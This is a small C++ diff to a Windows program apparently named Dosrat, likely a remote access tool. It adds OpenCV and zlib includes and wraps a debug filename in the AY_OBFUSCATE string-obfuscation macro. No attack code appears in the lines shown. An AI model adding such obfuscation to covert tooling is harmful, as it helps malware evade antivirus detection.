@@ -3,8 +3,11 @@
 #include <EssNet.h>
 #include <Essentials.h>
 #include <json.hpp>
+#include <opencv2/opencv.hpp>
+#include <zlib.h>
 
 using json = nlohmann::json;
+using namespace cv;
 
 string Version = "2.0.0-b.6";
 int VersioneCompatibile = 4;
@@ -25,7 +28,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     Settaggi sett;
     EasyMSGB msgb;
 
-    if (du.CheckFile(du.GetModuleFilePath() + "DosratDebug"))
+    if (du.CheckFile(du.GetModuleFilePath() + (string)AY_OBFUSCATE("DosratDebug")))
         DEBUG = true;
 
     AllocConsole();
